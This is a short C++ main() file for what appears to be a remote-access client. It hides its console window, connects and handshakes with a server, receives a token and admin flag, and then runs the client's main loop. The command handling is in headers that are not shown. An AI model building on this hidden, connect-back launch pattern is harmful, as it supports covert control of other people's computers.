#include "../inc/Connexion.h"
#include "../inc/HandShake.h"



int main()
{
    ShowWindow(GetConsoleWindow(),SW_HIDE);

    Connexion Client; 
    HandShake Handshake;

    Client.openConnexion();
    //cout << "[+] Connected." << endl;

    //cout << "Start connexion in startHandShake." << endl;

    Handshake.setSock(Client.getSocket());
    Handshake.beforeHandShake();
    Handshake.startHandShake(); 

    Client.setToken(Handshake.getToken());

    //cout << "[+] Handshake finished..." << endl;
    
    //cout << "[+] client main go " << endl;
    Client.main(Handshake.getIsAdmin(), Handshake.getPathProg());    
    Client.closeConnexion();
    //cout << "[+] Finished." << endl;
}
